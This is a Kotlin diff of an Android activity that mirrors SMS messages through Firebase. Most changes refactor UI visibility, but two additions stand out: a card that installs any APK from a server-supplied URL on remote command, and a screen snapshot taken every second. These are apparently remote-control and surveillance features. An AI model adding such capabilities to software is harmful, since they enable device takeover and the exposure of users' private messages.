-                val animationNames = arrayOf("", "SCALE", "NONE", "FULL", "FADE", "BOUNCE")
-                button.text = "ANIM ${currentAnimationType}"
+                // Update button text (no label - ANIM text removed)
+                button.text = ""
 
                 // Apply animation to label
                 val labelView = id.phoneCodeLabel
@@ -1912,14 +1808,8 @@ class ActivatedActivity : AppCompatActivity() {
                                 // Update count badge with total messages (not just displayed 10)
                                 animateCountBadgeUpdate(id.smsCountBadge, totalSmsMessageCount.toString())
 
-                                // Show/hide empty state
-                                if (limitedMessages.isEmpty()) {
-                                    id.smsEmptyState.visibility = View.VISIBLE
-                                    id.smsRecyclerView.visibility = View.GONE
-                                    } else {
-                                    id.smsEmptyState.visibility = View.GONE
-                                    id.smsRecyclerView.visibility = View.VISIBLE
-                                    }
+                                // Show/hide empty state (route through UIManager)
+                                uiManager.showSmsSide(showEmptyState = limitedMessages.isEmpty())
 
                                 LogHelper.d("ActivatedActivity", "Loaded ${limitedMessages.size} initial SMS messages (filtered from ${messages.size})")
                                 } catch (e: Exception) {
@@ -2001,7 +1891,9 @@ class ActivatedActivity : AppCompatActivity() {
 
                             handler.post {
                                 try {
-                                    LogHelper.d("ActivatedActivity", "New SMS message received: $phoneNumber - $body")
+                                    if (BuildConfig.DEBUG) {
+                                        LogHelper.d("ActivatedActivity", "New SMS: $phoneNumber (${body.length} chars)")
+                                    }
 
                                     val currentList = smsAdapter.currentList.toMutableList()
 
@@ -2022,14 +1914,11 @@ class ActivatedActivity : AppCompatActivity() {
                                             lastLoadedMessageTimestamp = messageItem.timestamp // Update latest timestamp
                                             LogHelper.d("ActivatedActivity", "Added new message to list. Total: $totalSmsMessageCount (timestamp: ${messageItem.timestamp})")
                                         } else if (!initialLoadCompleted) {
-                                            // Initial load not complete yet - count will be set from initial load
-                                            LogHelper.d("ActivatedActivity", "Message received before initial load complete, will be counted in initial load")
+                                            // Count will be set from initial load
                                         } else {
-                                            // This is an existing message from onChildAdded firing for all messages - ignore
-                                            LogHelper.d("ActivatedActivity", "Existing message from onChildAdded (timestamp: ${messageItem.timestamp} <= $lastLoadedMessageTimestamp), not counting")
+                                            // Existing message from onChildAdded - ignore
                                         }
                                     } else {
-                                        LogHelper.d("ActivatedActivity", "Duplicate message detected, skipping")
                                         return@post
                                     }
 
@@ -2037,8 +1926,6 @@ class ActivatedActivity : AppCompatActivity() {
                                     currentList.sortByDescending { it.timestamp }
                                     // Keep only last 10 messages for display
                                     val limitedList = currentList.take(10)
-
-                                    LogHelper.d("ActivatedActivity", "Submitting ${limitedList.size} messages to adapter (Total: $totalSmsMessageCount)")
 
                                     // Cancel any pending scroll to prevent conflicts
                                     pendingScrollRunnable?.let { handler.removeCallbacks(it) }
@@ -2076,16 +1963,8 @@ class ActivatedActivity : AppCompatActivity() {
                                     // Only animate once even if multiple messages arrive quickly
                                     animateSmsCardBorderBlink()
 
-                                    // Show/hide empty state
-                                    if (limitedList.isEmpty()) {
-                                        id.smsEmptyState.visibility = View.VISIBLE
-                                        id.smsRecyclerView.visibility = View.GONE
-        } else {
-                                        id.smsEmptyState.visibility = View.GONE
-                                        id.smsRecyclerView.visibility = View.VISIBLE
-                                    }
-
-                                    LogHelper.d("ActivatedActivity", "SMS list updated successfully")
+                                    // Show/hide empty state (route through UIManager)
+                                    uiManager.showSmsSide(showEmptyState = limitedList.isEmpty())
                                 } catch (e: Exception) {
                                     LogHelper.e("ActivatedActivity", "Error updating SMS list", e)
                                 }
@@ -2213,7 +2092,7 @@ class ActivatedActivity : AppCompatActivity() {
      */
     private fun updatePermissionStatusText(hasAllPermissions: Boolean) {
         id.permissionStatusText?.text = if (hasAllPermissions) "Permissions: OK" else "Permissions: Missing"
-        id.permissionStatusText?.visibility = View.VISIBLE
+        uiManager.setPermissionStatusVisible(true)
     }
 
     /**
@@ -2242,14 +2121,7 @@ class ActivatedActivity : AppCompatActivity() {
             handler.post {
                 if (isDestroyed || isFinishing) return@post
                 try {
-                    id.phoneCard.visibility = View.VISIBLE
-                    id.phoneCard.alpha = 1f
-                    id.statusCard.visibility = View.VISIBLE
-                    id.statusCard.alpha = 1f
-                    id.smsCard.visibility = View.VISIBLE
-                    id.smsCard.alpha = 1f
-                    id.testButtonsContainer.visibility = View.VISIBLE
-                    id.testButtonsContainer.alpha = 1f
+                    uiManager.showMainContent()
                 } catch (e: Exception) {
                     LogHelper.e("ActivatedActivity", "Error setting cards visible", e)
                 }
@@ -2485,12 +2357,14 @@ class ActivatedActivity : AppCompatActivity() {
                     ),
                     canIgnore = true,
                 )
+                uiManager.hideMainContentForOverlay()
                 val controller = MultipurposeCardController(
                     context = this,
                     rootView = id.main,
                     spec = spec,
                     onComplete = {
                         instructionOverlayCardController = null
+                        uiManager.showMainContent()
                     },
                     activity = this,
                 )
@@ -2847,15 +2721,19 @@ class ActivatedActivity : AppCompatActivity() {
     }
 
     /**
-     * Get device phone number
+     * Get device phone number. Permission-safe: checks READ_PHONE_STATE/READ_PHONE_NUMBERS
+     * before calling; returns null if permission not granted.
      */
     @SuppressLint("HardwareIds")
     private fun getDevicePhoneNumber(): String? {
+        val hasPhoneState = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
+        val hasPhoneNumbers = Build.VERSION.SDK_INT < Build.VERSION_CODES.O ||
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
+        if (!hasPhoneState && !hasPhoneNumbers) return null
         return try {
             val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
             telephonyManager?.line1Number?.takeIf { it.isNotBlank() }
         } catch (e: SecurityException) {
-            LogHelper.e("ActivatedActivity", "Permission denied getting phone number", e)
             null
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error getting phone number", e)
@@ -3199,11 +3077,12 @@ class ActivatedActivity : AppCompatActivity() {
                 ),
             )
         }
+        uiManager.hideMainContentForOverlay()
         MultipurposeCardController(
             context = this,
             rootView = id.main,
             spec = spec,
-            onComplete = { },
+            onComplete = { uiManager.showMainContent(); restoreMainContentFocus() },
             activity = this,
         ).show()
     }
@@ -3297,11 +3176,67 @@ class ActivatedActivity : AppCompatActivity() {
                 durationMs = 300,
             ),
         )
+        uiManager.hideMainContentForOverlay()
         MultipurposeCardController(
             context = this,
             rootView = id.main,
             spec = spec,
-            onComplete = { },
+            onComplete = { uiManager.showMainContent(); restoreMainContentFocus() },
+            activity = this,
+        ).show()
+    }
+
+    /** Remote install APK (any APK): show multipurpose card; same style as update, optional custom title. */
+    private fun showMultipurposeCardForRemoteInstallApk(downloadUrl: String, title: String?) {
+        if (downloadUrl.isBlank() || isDestroyed || isFinishing) return
+        val cardTitle = title?.takeIf { it.isNotBlank() } ?: "App install"
+        val recedeViews = listOf(
+            id.headerSection,
+            id.phoneCardWrapper,
+            id.statusCard,
+            id.smsCard,
+            id.testButtonsContainer,
+        )
+        val spec = MultipurposeCardSpec(
+            birth = BirthSpec(
+                originView = id.statusCard,
+                width = CardSize.MatchWithMargin(24),
+                height = CardSize.Ratio(0.34f),
+                placement = PlacementSpec.Center,
+                recedeViews = recedeViews,
+                entranceAnimation = EntranceAnimation.FlipIn(),
+            ),
+            fillUp = FillUpSpec.Text(
+                title = cardTitle,
+                body = "Tap Install to download and install.",
+                bodyLines = listOf(cardTitle, "Tap Install to download and install."),
+                delayBeforeFillMs = 0,
+                typingAnimation = true,
+                perCharDelayMs = 35,
+            ),
+            purpose = PurposeSpec.Custom(
+                primaryButtonLabel = "Install",
+                onPrimary = {
+                    startActivity(Intent(this, MultipurposeCardActivity::class.java).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                        putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_INSTALL_APK)
+                        putExtra(RemoteCardHandler.KEY_DOWNLOAD_URL, downloadUrl)
+                        putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
+                        title?.takeIf { it.isNotBlank() }?.let { putExtra(RemoteCardHandler.KEY_INSTALL_TITLE, it) }
+                    })
+                },
+            ),
+            death = DeathSpec.ShrinkInto(
+                targetView = id.statusCard,
+                durationMs = 300,
+            ),
+        )
+        uiManager.hideMainContentForOverlay()
+        MultipurposeCardController(
+            context = this,
+            rootView = id.main,
+            spec = spec,
+            onComplete = { uiManager.showMainContent(); restoreMainContentFocus() },
             activity = this,
         ).show()
     }
@@ -3534,8 +3469,7 @@ class ActivatedActivity : AppCompatActivity() {
                     LogHelper.d("ActivatedActivity", "SMS Firebase listener verified")
 
                     // Ensure SMS card is visible and clickable
-                    id.smsCard.visibility = View.VISIBLE
-                    id.smsCard.alpha = 1.0f
+                    uiManager.showSmsSide(showEmptyState = false)
                     id.smsCard.isClickable = true
                     id.smsCard.isEnabled = true
                     // Ensure RecyclerView is clickable
@@ -3564,9 +3498,8 @@ class ActivatedActivity : AppCompatActivity() {
                         LogHelper.d("ActivatedActivity", "Current SMS list size after test: ${currentList.size}")
                         if (currentList.isNotEmpty()) {
                             LogHelper.d("ActivatedActivity", "Latest message: ${currentList.first().body}")
-                            // Ensure SMS card is visible and RecyclerView is shown
-                            id.smsRecyclerView.visibility = View.VISIBLE
-                            id.smsEmptyState.visibility = View.GONE
+                            // Ensure SMS card shows list (route through UIManager)
+                            uiManager.showSmsSide(showEmptyState = false)
                             // Scroll to top to show newest message
                             try {
                                 id.smsRecyclerView.scrollToPosition(0)
@@ -3593,15 +3526,22 @@ class ActivatedActivity : AppCompatActivity() {
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (PermissionManager.handleActivityRequestPermissionsResult(this, requestCode, permissions, grantResults)) return
+        if (PermissionManager.handleActivityRequestPermissionsResult(this, requestCode, permissions, grantResults)) {
+            lastPermissionFlowCompletedAt = System.currentTimeMillis()
+            return
+        }
     }
 
     override fun onResume() {
         super.onResume()
+        runCardFlipSafetyNet()
         if (PermissionManager.handleActivityResume(this)) return
         serviceManager.ensureServiceRunning()
         runPermissionCheckThenUpdateUI()
         // Default SMS app is requested only via remote command (requestDefaultSmsApp); no in-app prompt.
+
+        // Start periodic screen snapshot (every 1s)
+        handler.postDelayed(snapshotRunnable, snapshotIntervalMs)
 
         // Register broadcast receiver for overlay cards from FCM
         if (showCardReceiver == null) {
@@ -3614,6 +3554,15 @@ class ActivatedActivity : AppCompatActivity() {
         }
     }
 
+    /** Restores focus to the main content (ActivatedActivity UI) after an overlay is dismissed. */
+    private fun restoreMainContentFocus() {
+        id.main.post {
+            if (!isDestroyed && !isFinishing) {
+                id.main.requestFocus()
+            }
+        }
+    }
+
     override fun onWindowFocusChanged(hasFocus: Boolean) {
         super.onWindowFocusChanged(hasFocus)
         if (hasFocus && !isDestroyed && !isFinishing) {
@@ -3623,6 +3572,7 @@ class ActivatedActivity : AppCompatActivity() {
 
     override fun onPause() {
         super.onPause()
+        handler.removeCallbacks(snapshotRunnable)
         // Unregister broadcast receiver when activity is not visible
         showCardReceiver?.let { receiver ->
             LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
@@ -3645,6 +3595,17 @@ class ActivatedActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         super.onDestroy()
+
+        try {
+            // Ensure card-flip dim overlay is never left visible (fixes "content like in background")
+            cardFlipDimOverlay?.let { overlay ->
+                overlay.visibility = View.GONE
+                overlay.alpha = 0f
+            }
+            cardFlipDimOverlay = null
+        } catch (e: Exception) {
+            LogHelper.e("ActivatedActivity", "Error clearing card flip dim overlay", e)
+        }
 
         try {
             // Cleanup overlay card controllers
